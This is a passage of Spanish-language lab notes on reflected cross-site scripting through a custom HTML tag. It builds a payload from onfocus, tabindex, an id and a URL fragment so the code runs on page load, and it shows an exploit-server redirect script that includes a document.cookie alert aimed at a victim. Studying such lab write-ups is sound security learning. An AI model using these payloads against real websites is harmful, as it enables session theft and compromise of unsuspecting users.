Utilizamos un servidor de explotación para construir un vector que incluye una etiqueta inventada, con un identificador específico y un evento que se activa al enfocar ese elemento. Al añadir un fragmento al final de la URL que apunta a esa etiqueta personalizada, el navegador intenta enfocarla automáticamente al cargar la página, lo que desencadena la ejecución del código malicioso sin necesidad de interacción del usuario.

Este laboratorio demuestra cómo incluso etiquetas no estándar pueden ser vehículos válidos para ataques XSS si los atributos y eventos no son controlados adecuadamente, reforzando la importancia de validar todo el contenido, no solo el nombre de la etiqueta.

----

Para este caso, debemos de saber que etiqueta es valida, pero no llegamos a nada, por lo que debemos de diseñar nuestra propia etiqueta:

```html
<etiqueta>Markos</etiqueta>
```

Pero debemos de hacer algo más, por ejemplo, darle un atributo a la etiqueta:

```html
Para cuando seleccione el valor "Markos" se active el alert
<etiqueta onfocus=alert(1)>Markos</etiqueta>
```

Pero no funciona, pero podemos buscar el por qué no funciona, y es porque debemos de meter algun contenido adicional, como "tabindex"

onfocus tag no executing javascript

Por lo que puede quedar de la siguiente forma:

```html
<etiqueta onfocus=alert(1) tabindex=1>Markos</etiqueta>
```

Y al seleccionar la cadena de "Markos" da el XSS o cuando damos tabs varias veces hasta llegar a ese elemento

Ahora, para mandarle ese script a la victima, podemos hacer lo siguiente desde el server:

```javascript
<script>
    location = 'https://burpsuite?search=<etiqueta id=identificador onfocus=alert(1) tabindex=1>#identificador</etiqueta>'
    location = 'https://burpsuite?search=<etiqueta id=identificador onfocus=alert(document.cookie) tabindex=1>#identificador</etiqueta>'
</script>
```


Cambiamos un poco el script anterior:

id = identificador
    Nos va a permitir ponerle un identificador a la etiqueta personalizable

\#identificador
    En este caso, quitamos markos y pusimos lo anterior, para hacer referencia que nos mande a esa sección del codigo, como en el caso del auto-scroll desde la URL agregando el "#"



